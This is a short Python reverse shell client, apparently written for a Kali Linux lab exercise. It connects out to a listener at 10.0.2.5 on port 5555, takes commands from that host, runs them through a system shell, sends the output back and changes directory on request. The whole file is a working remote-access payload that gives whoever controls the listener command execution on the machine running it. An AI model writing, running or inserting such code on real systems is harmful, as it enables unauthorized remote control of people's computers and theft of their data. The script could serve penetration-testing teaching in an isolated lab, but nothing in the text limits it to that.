import socket
import subprocess
import os

kali_ip = "10.0.2.5" #Your Kali may have a different IP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Start connection
s.connect((kali_ip, 5555))

#encode() is needed to convert your string input to bytes to be transferred over the network
s.send("Connected!\n".encode())

# Set up current path
path = os.getcwd()

while True:
    # Display current path to Kali
    s.send((path + " >> ").encode())

    #decode() is needed to convert your byte result to string to be displayed
    received_data = s.recv(1024).decode().rstrip()

	# End connection
    if (received_data == "&"):
        break

	# Handle change directory command
    if (received_data.split()[0] == "cd"):
        try:
            new_path = received_data.split()[1].encode()
            os.chdir(new_path)
            # Update path variable if chdir successful.
            path = os.getcwd()
			
        except FileNotFoundError:
            output = s.send("The specified directory does not exist.\n".encode())

    # Handle non-interactive commands and capture errors if raised
    else:
        try:
            output = subprocess.check_output(received_data, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
			
        s.send(output)

s.send("Ending connection.\n".encode())
s.close()